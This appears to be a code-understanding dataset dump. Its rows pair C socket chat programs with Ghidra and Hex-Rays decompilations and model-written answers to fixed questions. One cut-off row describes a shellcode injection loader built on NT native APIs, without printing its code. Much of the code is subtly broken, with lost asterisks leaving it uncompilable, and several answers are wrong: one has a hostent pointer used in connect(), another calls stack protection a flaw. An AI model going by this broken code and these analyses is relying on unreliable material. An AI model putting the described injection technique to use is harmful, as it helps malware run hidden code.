*(_DWORD *)(v10 + 276) = 0;
*(_DWORD *)v10 = 0;
*(_WORD *)(v10 + 4) = 272;
}
}
else
{
*_errno() = 12;
}
}
else
{
v10 = 0;
*_errno() = 2;
}
}
else
{
v10 = 0;
*_errno() = 22;
}
return v10;
}
// 403870: using guessed type char Src[288];
//----- (00403A30) --------------------------------------------------------
BOOL __cdecl __mingw_readdir(int a1)
{
int v1; // eax
BOOL result; // eax
if ( a1 )
{
v1 = *(_DWORD *)(a1 + 276);
*(_DWORD )(a1 + 276) = v1 + 1;
if ( v1 <= 0 )
return a1;
result = sub_4037C0((void **)(a1 + 272), a1);
if ( result )
return a1;
}
else
{
*_errno() = 9;
return 0;
}
return result;
}
//----- (00403A80) --------------------------------------------------------
int __cdecl __mingw_closedir(HANDLE *Block)
{
if ( Block && FindClose(Block[68]) )
{
free(Block);
return 0;
}
else
{
*_errno() = 9;
return -1;
}
}
//----- (00403AD0) --------------------------------------------------------
_DWORD *__cdecl __mingw_rewinddir(int a1)
{
_DWORD result; // eax
if ( a1 && FindClose((HANDLE *)(a1 + 272)) )
{
result = sub_4036F0((const CHAR *)(a1 + 280), a1);
*(_DWORD *)(a1 + 272) = result;
if ( result != (_DWORD *)-1 )
*(_DWORD *)(a1 + 276) = 0;
}
else
{
result = _errno();
*result = 9;
}
return result;
}
//----- (00403B30) --------------------------------------------------------
int __cdecl __mingw_telldir(int a1)
{
if ( a1 )
return *(_DWORD *)(a1 + 276);
*_errno() = 9;
return -1;
}
//----- (00403B60) --------------------------------------------------------
int *__cdecl __mingw_seekdir(int a1, int a2)
{
int *result; // eax
if ( a2 < 0 )
{
result = _errno();
*result = 22;
}
else
{
result = __mingw_rewinddir(a1);
if ( a2 && *(_DWORD *)(a1 + 272) != -1 )
{
do
{
result = (int )((_DWORD *)(a1 + 276) + 1);
*(_DWORD *)(a1 + 276) = result;
if ( a2 <= (int)result )
break;
result = (int )sub_4037C0((void **)(a1 + 272), a1);
}
while ( result );
}
}
return result;
}
//----- (00403D50) --------------------------------------------------------
int register_frame_ctor()
{
return __gcc_register_frame();
}
// nfuncs=91 queued=43 decompiled=43 lumina nreq=0 worse=0 better=0
// ALL OK, 43 function(s) have been successfully decompiled","1. The primary functionality of the code is to dynamically load native Windows functions, allocate executable memory, copy shellcode into that memory, create a thread to execute the shellcode, and wait for the execution to finish. This code is typically used for injecting and executing malicious code (shellcode) within the process's own address space.

2. Three key functions and their purposes are:
   - NtAllocateVirtualMemory: Allocates a region of memory with specified access rights, typically for executing shellcode.
   - NtWriteVirtualMemory: Writes the shellcode into the allocated memory, making it ready for execution.
   - NtCreateThreadEx: Creates a thread to execute the shellcode that is now in memory.

3. The `exec` variable serves as a pointer to the base address of the allocated memory region where the shellcode is to be written and executed. Its value is set by the NtAllocateVirtualMemory function and is used by NtWriteVirtualMemory and NtCreateThreadEx to respectively write and execute the shellcode.

4. The error handling mechanism consists of checking the function pointers right after they are assigned with the addresses of the native API functions. If any of the function pointers are NULL (indicating failure to load a function), the program prints an error message and terminates with a non-zero exit code.

5. The flow of execution for the memory allocation section: First, the `exec` variable is initialized to NULL. The size of the shellcode is calculated. The NtAllocateVirtualMemory function is then called with the current process handle, the address of `exec`, and permissions to commit and reserve memory with execution rights. The function updates `exec` to point to the allocated memory.

6. The code relies on the following external libraries or dependencies:
   - The C Standard Library, for standard input/output functions (stdio.h).
   - The Windows API, for accessing system-level functions and constants (windows.h), and particularly ntdll.dll for native API functions.

7. Evident security concerns include:
   - The use of potentially dangerous shellcode, which can be malicious.
   - Direct interaction with low-level system APIs to manipulate memory and thread execution can be used to bypass security measures.
   - Allocating memory with PAGE_EXECUTE_READWRITE permissions weakens process security and can be exploited by other malicious code.
   - Lack of rigorous error checking and handling, which may lead to unpredictable results or system stability issues if the API functions fail.","1. **Primary Functionality:**
The code is responsible for dynamically retrieving and invoking NT (Native API) functions to allocate, write to, and execute memory within the current process, which resembles shellcode injection behavior.

2. **Three Key Functions:**
- `_GetProcAddress@8`: Retrieves addresses of functions within a specified module.
- `_GetModuleHandleA@4`: Retrieves a module's handle, needed to find function addresses with `_GetProcAddress@8`.
- `_puts`: Writes a string to standard output, used here for error messages.

3. **Role of local_3c Variable:**
`local_3c` stores the base address where virtual memory is allocated. It initially holds zero, but after the call to `NtAllocateVirtualMemory`, it holds the starting address of the allocated memory.

4. **Error Handling Mechanism:**
The code checks whether `_GetProcAddress@8` successfully retrieves function pointers. If any function cannot be loaded, an error message is printed using `_puts`, and the program returns with a non-zero exit code (status `1`).

5. **Flow of Execution (Memory Allocation Section):**
- The handle of the current process is retrieved.
- `NtAllocateVirtualMemory` is called to allocate executable memory.
- The base address of the allocated memory is stored in `local_3c`.
- Memory is then written to using `NtWriteVirtualMemory`.

6. **External Libraries/Dependencies:**
The snippet interacts with Windows system libraries to load and use functions: `kernel32.dll` (for `GetCurrentProcess`, `GetModuleHandleA`) and `ntdll.dll` (for NT functions).

7. **Security Concerns:**
- The code is a form of shellcode injection, which could be used in malware.
- It uses NT APIs directly which bypasses higher-level API checks and is generally a tactic to avoid detection.
- It allocates and writes executable memory, which can be flagged by anti-malware tools as suspicious.
- Strings are hardcoded which could be a simple obfuscation attempt to avoid string-based detection systems.","1. The primary functionality of the code appears to be related to initializing a C runtime environment, handling filesystem operations with extended pattern matching capabilities (`glob`), and managing exceptions and errors. It provides a set of functions for dealing with threads, TLS (thread-local storage), dynamic constructors/destructors, and internationalization support.

2. Three key functions:
- `mainCRTStartup()`: Entry point function for console applications, sets up the environment before calling the main function.
- `__mingw_glob()`: Implements globbing functionality, which is pattern matching for filenames. It generates a list of files that match a specified pattern.
- `TopLevelExceptionFilter()`: An exception filter function used as a top-level structured exception handling mechanism that processes unhandled exceptions.

3. The variable `CTOR_LIST` is an array of function pointers representing constructors that need to be called to initialize global objects before the main application starts.

4. The error handling mechanisms include the use of structured exception handling by the usage of `TopLevelExceptionFilter`, checking the return values of system calls and setting the error number (`errno`) accordingly. There are also custom error handling functions like `sub_401EC0` that output error messages and terminate the application.

5. The flow of execution in `mainCRTStartup()` begins with setting the application type to console mode, then calling `sub_4011B0` to initialize the main arguments and environment. It then calls `__main()` for global constructors before calling the actual `main()` function. Afterwards, it concludes with cleanup calls like `_cexit()` and finally calls `ExitProcess()`.

6. This code has an external dependency on the Microsoft Windows API for various system calls (e.g., `VirtualQuery`, `TlsGetValue`, `LoadLibraryA`), the C Standard Library, and possibly the MinGW specific runtime libraries (`mingw32`).

7. Evident security concerns may include:
- The use of `strcpy` and `strdup` without bounds checking could lead to buffer overflows.
- Error handling includes direct calls to `abort()` which could lead to application crashes without proper cleanup or logging.
- Exception handling flow seems to call a terminate function (`sub_4011B0`) which may not correctly handle resource deallocation.
- Using pointer arithmetic without sufficient checks could result in undefined behavior or memory corruption."
11,https://github.com/apsrcreatix/Socket-Programming-With-C/tree/master/06-half-duplex-chat-tcp-ip,Done,Linux,"/*
* Title : Half duplex client side
* Name : Aditya Pratap Singh Rajput
* Subject : Network Protocols And Programming using C
*
Note : please consider the TYPOS in comments.
Thanks.
/
#include ""stdio.h""
#include ""stdlib.h""
#include ""string.h""
//headers for socket and related functions
#include <sys/types.h>
#include <sys/socket.h>
//for including structures which will store information needed
#include <netinet/in.h>
#include <unistd.h>
//for gethostbyname
#include ""netdb.h""
#include ""arpa/inet.h""
//defines
#define h_addr h_addr_list[0] / for backward compatibility */
#define PORT 9002 // port number
#define MAX 1000 //maximum buffer size
//main function
int main(){
char serverResponse[MAX];
char clientResponse[MAX];
//creating a socket
int socketDescriptor = socket(AF_INET, SOCK_STREAM, 0);
//placeholder for the hostname and my ip address
char hostname[MAX], ipaddress[MAX];
struct hostent hostIP; //placeholder for the ip address
//if the gethostname returns a name then the program will get the ip address
if(gethostname(hostname,sizeof(hostname))==0){
hostIP = gethostbyname(hostname);//the netdb.h fucntion gethostbyname
}else{
printf(""ERROR:FCC4539 IP Address Not "");
}
struct sockaddr_in serverAddress;
serverAddress.sin_family = AF_INET;
serverAddress.sin_port = htons(PORT);
serverAddress.sin_addr.s_addr = INADDR_ANY;
connect(socketDescriptor, (struct sockaddr )&serverAddress, sizeof(serverAddress));
// getting the address port and remote host
printf(""\nLocalhost: %s\n"", inet_ntoa((struct in_addr)hostIP->h_addr));
printf(""Local Port: %d\n"", PORT);
printf(""Remote Host: %s\n"", inet_ntoa(serverAddress.sin_addr));
while (1)
{ //recieve the data from the server
recv(socketDescriptor, serverResponse, sizeof(serverResponse), 0);
//recieved data from the server successfully then printing the data obtained from the server
printf(""\nSERVER : %s"", serverResponse);
printf(""\ntext message here... :"");
scanf(""%s"", clientResponse);
send(socketDescriptor, clientResponse, sizeof(clientResponse), 0);
}
//closing the socket
close(socketDescriptor);
return 0;
}","{
""functions"": [
""main""
]
}","{
""variables"": [
""serverResponse"",
""clientResponse"",
""socketDescriptor"",
""hostname"",
""ipaddress"",
""hostIP"",
""serverAddress""
]
}","/*
* Title : Half duplex client side
* Name : Aditya Pratap Singh Rajput
* Subject : Network Protocols And Programming using C
*
Note : please consider the TYPOS in comments.
Thanks.
/
//headers for socket and related functions
//for including structures which will store information needed
//for gethostbyname
//defines
#define h_addr h_addr_list[0] / for backward compatibility */
#define PORT 9002 // port number
#define MAX 1000 //maximum buffer size
//main function
//creating a socket
//placeholder for the hostname and my ip address
//if the gethostname returns a name then the program will get the ip address
//the netdb.h function gethostbyname
// getting the address port and remote host
//recieve the data from the server
//recieved data from the server successfully then printing the data obtained from the server
//closing the socket","t(int __domain,int __type,int __protocol);
ssize_t recv(int __fd,void *__buf,size_t __n,int __flags);
char * inet_ntoa(in_addr __in);
uint16_t htons(uint16_t __hostshort);
ssize_t send(int __fd,void *__buf,size_t __n,int __flags);
hostent * gethostbyname(char *__name);
int gethostname(char *__name,size_t __len);
int connect(int __fd,sockaddr __addr,socklen_t __len);
/ WARNING: Globals starting with '_' overlap smaller symbols at the same address */
void main(void)
{
int __fd;
int iVar1;
char *pcVar2;
hostent *local_bd8;
undefined local_bd0 [16];
undefined auStack_bc0 [1000];
undefined auStack_7d8 [1000];
char acStack_3f0 [1000];
undefined8 local_8;
local_8 = ___stack_chk_guard;
__fd = socket(2,1,0);
iVar1 = gethostname(acStack_3f0,1000);
if (iVar1 == 0) {
local_bd8 = gethostbyname(acStack_3f0);
}
else {
printf(""ERROR:FCC4539 IP Address Not "");
}
local_bd0.0_2 = 2;
local_bd0.2_2 = htons(0x232a);
local_bd0.4_4 = 0;
connect(__fd,(sockaddr )local_bd0,0x10);
pcVar2 = inet_ntoa((in_addr)(in_addr_t *)*local_bd8->h_addr_list);
printf(""\nLocalhost: %s\n"",pcVar2);
printf(""Local Port: %d\n"",0x232a);
pcVar2 = inet_ntoa((in_addr)local_bd0.4_4);
printf(""Remote Host: %s\n"",pcVar2);
do {
recv(__fd,auStack_bc0,1000,0);
printf(""\nSERVER : %s"",auStack_bc0);
printf(""\ntext message here... :"");
__isoc99_scanf(&DAT_00100c78,auStack_7d8);
send(__fd,auStack_7d8,1000,0);
} while( true );
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <defs.h>
//-------------------------------------------------------------------------
// Function declarations
void *init_proc();
void sub_860();
// int __fastcall __libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int __fastcall __cxa_finalize(void *);
// char *inet_ntoa(struct in_addr in);
// uint16_t htons(uint16_t hostshort);
// ssize_t recv(int fd, void *buf, size_t n, int flags);
// __int64 gmon_start(void); weak
// void __noreturn abort(void);
// ssize_t send(int fd, const void *buf, size_t n, int flags);
// int connect(int fd, const struct sockaddr *addr, socklen_t len);
// __int64 __isoc99_scanf(const char *, ...); weak
// int socket(int domain, int type, int protocol);
// int gethostname(char *name, size_t len);
// int printf(const char *format, ...);
// struct hostent *gethostbyname(const char *name);
void __fastcall __noreturn start(void (*rtld_fini)(void), int a2, int a3, int a4, int a5, int a6, int a7, int a8, int argc, char *ubp_av); // idb
void *call_weak_fn();
char *deregister_tm_clones();
char *register_tm_clones();
__int64 _do_global_dtors_aux();
int __fastcall main(int argc, const char **argv, const char **envp);
void term_proc();
// int __fastcall _cxa_finalize(void *);
// __int64 ITM_deregisterTMCloneTable(void); weak
// __int64 ITM_registerTMCloneTable(void); weak
//-------------------------------------------------------------------------
// Data declarations
void *_dso_handle = &_dso_handle; // weak
char _bss_start; // weak
// extern UNKNOWN gmon_start; weak
//----- (0000000000000848) ----------------------------------------------------
void *init_proc()
{
return call_weak_fn();
}
//----- (0000000000000860) ----------------------------------------------------
void sub_860()
{
JUMPOUT(0LL);
}
// 870: control flows out of bounds to 0
//----- (0000000000000980) ----------------------------------------------------
void __fastcall __noreturn start(
void (*rtld_fini)(void),
int a2,
int a3,
int a4,
int a5,
int a6,
int a7,
int a8,
int argc,
char *ubp_av)
{
__libc_start_main((int (fastcall *)(int, char **, char **))main, argc, &ubp_av, 0LL, 0LL, rtld_fini, &argc);
abort();
}
//----- (00000000000009B4) ----------------------------------------------------
void *call_weak_fn()
{
void *result; // x0
result = &gmon_start;
if ( &gmon_start )
return (void *)gmon_start();
return result;
}
// 8D0: using guessed type __int64 gmon_start(void);
//----- (00000000000009D0) ----------------------------------------------------
char *deregister_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 120D8: using guessed type __int64 ITM_deregisterTMCloneTable(void);
//----- (0000000000000A00) ----------------------------------------------------
char *register_tm_clones()
{
return &_bss_start;
}
// 12010: using guessed type char _bss_start;
// 120E8: using guessed type __int64 ITM_registerTMCloneTable(void);
//----- (0000000000000A40) ----------------------------------------------------
__int64 _do_global_dtors_aux()
{
__int64 result; // x0
result = (unsigned __int8)_bss_start;
if ( !_bss_start )
{
if ( &_cxa_finalize )
__cxa_finalize(_dso_handle);
deregister_tm_clones();
result = 1LL;
_bss_start = 1;
}
return result;
}
// 12008: using guessed type void *_dso_handle;
// 12010: using guessed type char _bss_start;
//----- (0000000000000A94) ----------------------------------------------------
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
struct in_addr v3; // w0
char *v4; // x0
struct in_addr v5; // w0
char *v6; // x0
int fd; // [xsp+14h] [xbp+14h]
struct hostent *v8; // [xsp+18h] [xbp+18h]
struct sockaddr addr; // [xsp+20h] [xbp+20h] BYREF
char buf[1000]; // [xsp+30h] [xbp+30h] BYREF
char v11[1000]; // [xsp+418h] [xbp+418h] BYREF
char name[1000]; // [xsp+800h] [xbp+800h] BYREF
fd = socket(2, 1, 0);
if ( gethostname(name, 0x3E8uLL) )
printf(""ERROR:FCC4539 IP Address Not "");
else
v8 = gethostbyname(name);
addr.sa_family = 2;
*(_WORD *)addr.sa_data = htons(0x232Au);
*(_DWORD *)&addr.sa_data[2] = 0;
connect(fd, &addr, 0x10u);
v3.s_addr = **(_DWORD **)v8->h_addr_list;
v4 = inet_ntoa(v3);
printf(""\nLocalhost: %s\n"", v4);
printf(""Local Port: %d\n"", 9002LL);
v5.s_addr = *(_DWORD *)&addr.sa_data[2];
v6 = inet_ntoa(v5);
printf(""Remote Host: %s\n"", v6);
while ( 1 )
{
recv(fd, buf, 0x3E8uLL, 0);
printf(""\nSERVER : %s"", buf);
printf(""\ntext message here... :"");
__isoc99_scanf(""%s"", v11);
send(fd, v11, 0x3E8uLL, 0);
}
}
// B2C: variable 'v8' is possibly undefined
// 910: using guessed type __int64 __isoc99_scanf(const char *, ...);
//----- (0000000000000BDC) ----------------------------------------------------
void term_proc()
{
;
}
// nfuncs=38 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled","1. The primary functionality of this code is to act as a half-duplex client in a client-server model. It connects to a server, receives messages from the server, and sends responses back to the server in a half-duplex fashion.

2. Three key functions are:
   - `socket()`: Used to create a new socket, an endpoint for communication.
   - `connect()`: Establishes a connection to the specified server with the created socket.
   - `recv()`: Receives data from the connected server through the socket.

3. `socketDescriptor`: This variable represents the client's end of the communication link, holding the file descriptor for the created socket after the `socket()` call is successful.

4. The error handling mechanism is minimal and appears as a print statement following a failed `gethostname()` call. If this call fails, the client prints an error message indicating an IP address retrieval issue.

5. In the `while (1)` loop, the client uses `recv()` to wait for and accept data from the server, prints the server's message, prompts the user for a response, reads input into `clientResponse` using `scanf()`, and then sends it back to the server using `send()`.

6. The external libraries or dependencies required by this code include:
   - Standard I/O library (`stdio.h`)
   - Standard Library (`stdlib.h` and `string.h`)
   - Socket-related functions (`sys/types.h`, `sys/socket.h`)
   - Structures for storing address information (`netinet/in.h`)
   - UNIX Standard function definitions (`unistd.h`)
   - Functions for network database operations (`netdb.h`, `arpa/inet.h`)

7. Evident security concerns in the code are:
   - There's no validation of server responses before printing, risking potential buffer overflows.
   - The use of `scanf()` without limiting input size can lead to overflows.
   - The program assumes `gethostbyname()` will always succeed without checking if the result is NULL.
   - The use of a while(1) loop with no exit condition could risk an endless loop if not managed properly.
   - Lack of encrypted communications exposes data to potential interception.","1. The primary functionality of the code is to create a simple TCP client that connects to a server on port 9002 (`0x232a` in hexadecimal), exchanges messages with the server, and prints the communication to the console.

2. Three key functions are:
- `socket()`: Establishes a socket connection by specifying the domain (`AF_INET` for IPv4), type (`SOCK_STREAM` for TCP), and protocol (defaulting to 0 for TCP).
- `gethostbyname()`: Retrieves host information corresponding to a hostname, which is used to make a connection to that host.
- `send()` and `recv()`: Used for sending and receiving messages through the established socket connection.

3. The variable `local_bd8` of type `hostent *` serves as a pointer to the structure that contains the host's information, such as its IP address. It is obtained by calling `gethostbyname()` and is used in `connect()` to establish a connection to the server.

4. The error handling mechanism in the code is basic. It checks if `gethostname()` returns 0 (success); if not, it prints an ""IP Address Not"" message with an incomplete sentence, likely due to an error while capturing the error message. It lacks further error checking for other critical functions like `socket()`, `connect()`, `recv()`, and `send()`.

5. In the section where a connection is attempted, the code sets up the `local_bd0` variable with necessary details (family, port, and address), then calls `connect()` to initiate a connection to the server. It takes the first address from `local_bd8->h_addr_list` to establish the connection, and then communication begins.

6. The code likely depends on external libraries such as:
- `sys/socket.h` for socket functions (`socket()`, `connect()`, etc.)
- `netinet/in.h` for network address structures (`sockaddr`, `in_addr`, etc.)
- `netdb.h` for definitions of network database operations (`gethostbyname()`, `hostent`)
- `stdio.h` for input/output functions (`printf()`, `scanf()`)
- `arpa/inet.h` for internet address manipulation (`inet_ntoa()`, `htons()`).

7. Evident security concerns include:
- The use of `___stack_chk_guard` which suggests stack protection is in place; however, the code lacks checks after its use which may lead to stack buffer overflow vulnerabilities.
- The code uses `scanf` without limiting input size, which can lead to buffer overflow.
- Lack of validation of the return values for critical functions can lead to undefined behavior or exploitation.
- The use of `inet_ntoa()` can lead to overwriting if the output is not handled properly, as it returns a pointer to a static buffer which gets overwritten by each call.
- The infinite `do-while` loop could lead to a denial of service from an unresponsive server or if the client receives excessive data faster than it can process.","1. The code establishes a socket connection to a pre-defined port, presumably on a local machine, receives and sends text messages to a connected server in a continuous loop.

2. `main`: The primary function that sets up a client-side network connection and handles message exchange.
`socket`: Opens a communication endpoint, specifying it should use IPv4 (2) and TCP (1).
`connect`: Establishes a connection to an address (`struct sockaddr`) on a specified file descriptor `fd`.

3. The variable `fd` holds the file descriptor of the newly created socket. It is used for subsequent operations, such as connecting to the server and sending or receiving data over the network.

4. Error handling in this code is minimal; it prints an error message if `gethostname` fails. If `connect` or other critical functions fail, it doesn't handle errors; the program execution continues regardless of success.

5. Once the main function initializes and sets up the network connection, it enters an indefinite loop. It waits to receive data (`recv`), prints server messages, prompts the user for input, reads it (`__isoc99_scanf`), and then sends the user's message (`send`).

6. The code references several standard networking libraries and functions, such as `socket`, `connect`, `recv`, and `send`. These functions are defined in the `<sys/socket.h>`, `<netinet/in.h>`, `<arpa/inet.h>`, and `<netdb.h>` header files in UNIX-like systems.

7. Security concerns include the lack of input validation on user input, which can lead to buffer overflow vulnerabilities. There is no encryption for data in transit, potentially exposing sensitive information. There's also a failure to check return values of critical functions (`connect`, `recv`, `send`), which could lead to undefined behavior."
12,https://github.com/apsrcreatix/Socket-Programming-With-C/tree/master/06-half-duplex-chat-tcp-ip,Done,Linux,"/*
* Title : Half duplex server side
* Name : Aditya Pratap Singh Rajput
* Subject : Network Protocols And Programming using C
*
Note : please consider the TYPOS in comments.
Thanks.
/
#include ""stdio.h""
#include ""stdlib.h""
#include ""string.h""
//headers for socket and related functions
#include <sys/types.h>
#include <sys/socket.h>
//for including structures which will store information needed
#include <netinet/in.h>
#include <unistd.h>
//for gethostbyname
#include ""netdb.h""
#include ""arpa/inet.h""
#define MAX 1000
#define BACKLOG 5 // how many pending connections queue will hold
int main()
{
char serverMessage[MAX];
char clientMessage[MAX];
//create the server socket
int socketDescriptor = socket(AF_INET, SOCK_STREAM, 0);
struct sockaddr_in serverAddress;
serverAddress.sin_family = AF_INET;
serverAddress.sin_port = htons(9002);
serverAddress.sin_addr.s_addr = INADDR_ANY;
//calling bind function to oir specified IP and port
bind(socketDescriptor, (struct sockaddr)&serverAddress, sizeof(serverAddress));
listen(socketDescriptor, BACKLOG);
//starting the accepting
int clientSocketDescriptor = accept(socketDescriptor, NULL, NULL);
while (1)
{
printf(""\ntext message here .. :"");
scanf(""%s"", serverMessage);
send(clientSocketDescriptor, serverMessage, sizeof(serverMessage) , 0);
//recieve the data from the server
recv(clientSocketDescriptor, &clientMessage, sizeof(clientMessage), 0) ;
//recieved data from the server successfully then printing the data obtained from the server
printf(""\nCLIENT: %s"", clientMessage);
}
//close the socket
close(socketDescriptor);
return 0;
}","{
""functions"": [
""main""
]
}","{
""variables"": [
""serverMessage"",
""clientMessage"",
""socketDescriptor"",
""serverAddress"",
""clientSocketDescriptor""
]
}","/*
* Title : Half duplex server side
* Name : Aditya Pratap Singh Rajput
* Subject : Network Protocols And Programming using C
*
Note : please consider the TYPOS in comments.
Thanks.
*/
//headers for socket and related functions
//for including structures which will store information needed
//for gethostbyname
//create the server socket
//calling bind function to our specified IP and port
//starting the accepting
//recieve the data from the server
//recieved data from the server successfully then printing the data obtained from the server
//close the socket","int accept(int __fd,sockaddr *__addr,socklen_t *__addr_len);
uint16_t htons(uint16_t __hostshort);
ssize_t send(int __fd,void *__buf,size_t __n,int __flags);
int listen(int __fd,int __n);
int bind(int __fd,sockaddr *__addr,socklen_t __len);
ssize_t recv(int __fd,void __buf,size_t __n,int __flags);
int socket(int __domain,int __type,int __protocol);
/ WARNING: Globals starting with '_' overlap smaller symbols at the same address */
void main(void)
{
int iVar1;
sockaddr local_7e8;
undefined auStack_7d8 [1000];
undefined auStack_3f0 [1000];
undefined8 local_8;
local_8 = ___stack_chk_guard;
iVar1 = socket(2,1,0);
local_7e8.sa_family = 2;
local_7e8.sa_data.0_2 = htons(0x232a);
local_7e8.sa_data[2] = '\0';
local_7e8.sa_data[3] = '\0';
local_7e8.sa_data[4] = '\0';
local_7e8.sa_data[5] = '\0';
bind(iVar1,&local_7e8,0x10);
listen(iVar1,5);
iVar1 = accept(iVar1,(sockaddr *)0x0,(socklen_t *)0x0);
do {
printf(""\ntext message here .. :"");
__isoc99_scanf(&DAT_00100b78,auStack_7d8);
send(iVar1,auStack_7d8,1000,0);
recv(iVar1,auStack_3f0,1000,0);
printf(""\nCLIENT: %s"",auStack_3f0);
} while( true );
}","/* This file was generated by the Hex-Rays decompiler version 8.3.0.230608.
Copyright (c) 2007-2021 Hex-Rays mailto:info@hex-rays.com
Detected compiler: GNU C++
*/
#include <defs.h>
//-------------------------------------------------------------------------
// Function declarations
void *init_proc();
void sub_820();
// int __fastcall __libc_start_main(int (__fastcall *main)(int, char **, char **), int argc, char **ubp_av, void (*init)(void), void (*fini)(void), void (*rtld_fini)(void), void *stack_end);
// int listen(int fd, int n);
// int bind(int fd, const struct sockaddr *addr, socklen_t len);
// int __fastcall __cxa_finalize(void *);
// int accept(int fd, struct sockaddr *addr, socklen_t *addr_len);
// uint16_t htons(uint16_t hostshort);
// ssize_t recv(int fd, void *buf, size_t n, int flags);
// __int64 gmon_start(void); weak
// void __noreturn abort(void);
// ssize_t send(int fd, const void *buf, size_t n, int flags);
// __int64 __isoc99_scanf(const char *, ...); weak
// int socket(int domain, int type, int protocol);
// int printf(const char *format, ...);
void __fastcall __noreturn start(void (*rtld_fini)(void), int a2, int a3, int a4, int a5, int a6, int a7, int a8, int argc, char *ubp_av); // idb
void *call_weak_fn();
char *deregister_tm_clones();
char *register_tm_clones();
__int64 _do_global_dtors_aux();
int __fastcall main(int argc, const char **argv, const char **envp);
void term_proc();
// int __fastcall _cxa_finalize(void *);
// __int64 ITM_deregisterTMCloneTable(void); weak
// __int64 ITM_registerTMCloneTable(void); weak
//-------------------------------------------------------------------------
// Data declarations
void *_dso_handle = &_dso_handle; // weak
char _bss_start; // weak
// extern UNKNOWN gmon_start; weak
//----- (0000000000000800) ----------------------------------------------------
void *init_proc()
{
return call_weak_fn();
}
//----- (0000000000000820) ----------------------------------------------------
void sub_820()
{
JUMPOUT(0LL);
}
// 830: control flows out of bounds to 0
//----- (0000000000000940) ----------------------------------------------------
void __fastcall __noreturn start(
void (*rtld_fini)(void),
int a2,
int a3,
int a4,
int a5,
int a6,
int a7,
int a8,
int argc,
char *ubp_av)
{
__libc_start_main((int (fastcall *)(int, char **, char **))main, argc, &ubp_av, 0LL, 0LL, rtld_fini, &argc);
abort();
}
//----- (0000000000000974) ----------------------------------------------------
void *call_weak_fn()
{
void *result; // x0
result = &gmon_start;
if ( &gmon_start )
return (void *)gmon_start();
return result;
}
// 8B0: using guessed type __int64 gmon_start(void);
//----- (0000000000000990) ----------------------------------------------------
char *deregister_tm_clones()
{
return &_bss_start;
}
// 11010: using guessed type char _bss_start;
// 110D0: using guessed type __int64 ITM_deregisterTMCloneTable(void);
//----- (00000000000009C0) ----------------------------------------------------
char *register_tm_clones()
{
return &_bss_start;
}
// 11010: using guessed type char _bss_start;
// 110E0: using guessed type __int64 ITM_registerTMCloneTable(void);
//----- (0000000000000A00) ----------------------------------------------------
__int64 _do_global_dtors_aux()
{
__int64 result; // x0
result = (unsigned __int8)_bss_start;
if ( !_bss_start )
{
if ( &_cxa_finalize )
__cxa_finalize(_dso_handle);
deregister_tm_clones();
result = 1LL;
_bss_start = 1;
}
return result;
}
// 11008: using guessed type void *_dso_handle;
// 11010: using guessed type char _bss_start;
//----- (0000000000000A54) ----------------------------------------------------
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
int fd; // [xsp+10h] [xbp+10h]
int v4; // [xsp+14h] [xbp+14h]
struct sockaddr addr; // [xsp+18h] [xbp+18h] BYREF
char buf[1000]; // [xsp+28h] [xbp+28h] BYREF
char v7[1000]; // [xsp+410h] [xbp+410h] BYREF
fd = socket(2, 1, 0);
addr.sa_family = 2;
*(_WORD *)addr.sa_data = htons(0x232Au);
*(_DWORD *)&addr.sa_data[2] = 0;
bind(fd, &addr, 0x10u);
listen(fd, 5);
v4 = accept(fd, 0LL, 0LL);
while ( 1 )
{
printf(""\ntext message here .. :"");
__isoc99_scanf(""%s"", buf);
send(v4, buf, 0x3E8uLL, 0);
recv(v4, v7, 0x3E8uLL, 0);
printf(""\nCLIENT: %s"", v7);
}
}
// 8E0: using guessed type __int64 __isoc99_scanf(const char *, ...);
//----- (0000000000000B40) ----------------------------------------------------
void term_proc()
{
;
}
// nfuncs=36 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled","1. The code implements a simple TCP server that accepts connections from clients and engages in half-duplex communication, meaning it can either send or receive messages one at a time, but not simultaneously.

2. `socket()`: Creates a socket descriptor for network communication. `bind()`: Assigns the address specified by serverAddress to the socket referred to by socketDescriptor. `accept()`: Waits for a client to connect to the server and establishes a connection.

3. `serverMessage`: An array to store the message that the server will send to the client. It gets populated by user input and is then sent through the established TCP connection.

4. The error handling mechanism is not implemented in the provided code. No checks are in place to ensure system calls such as `socket()`, `bind()`, `listen()`, and `accept()` complete successfully, which is a typical requirement in robust applications.

5. After creating a server socket, the server enters an infinite loop where it first prompts the user to enter a message, then sends this message to the client, and finally, receives a response from the client, outputting the client's message to the console.

6. External libraries or dependencies include:
   - `stdio.h`: Standard input/output library for functions such as `printf()` and `scanf()`.
   - `stdlib.h`: For general utility functions like `exit()`.
   - `string.h`: For string manipulation functions.
   - `sys/types.h` and `sys/socket.h`: For sockets programming.
   - `netinet/in.h`: For internet protocol family.
   - `unistd.h`: For various POSIX functions like `close()`.
   - `netdb.h`: For network database operations.
   - `arpa/inet.h`: For definitions of internet operations.

7. Evident security concerns include:
   - Lack of error checking which can lead to crashes or undefined behavior.
   - Use of unbounded `scanf()` which can cause buffer overflows.
   - The server accepts any incoming connection without authentication.
   - Fixed-size buffers can be exploited if input exceeds expected size.
   - No encryption or secure communication protocol is implemented.","1. The primary functionality of the code is to create a simple TCP/IP socket server that listens for connections on port 9002, accepts incoming connections, receives messages from clients, and sends responses back to them.

2. Three key functions:

   - `socket()`: Initializes a new socket using the given address domain, socket type, and protocol. In this case, a stream socket in the Internet domain is created.
   - `bind()`: Binds the socket to an address and port number specified in `local_7e8`, enabling the socket to accept connections on that address and port.
   - `accept()`: Waits for an incoming connection request on the bound socket; once a request is received, it's accepted and a new socket file descriptor is returned for the established connection.

3. The variable `iVar1` is used to store file descriptors returned by `socket()` and `accept()`. Initially, it stores the descriptor of the listening socket and after the `accept()` call, it stores the descriptor of the specific client connection.

4. The error handling mechanism is inadequate; the code does not check the return values of `socket()`, `bind()`, `listen()`, `accept()`, `send()`, or `recv()`. Normally, error checking should be done after each of these calls to handle potential failures.

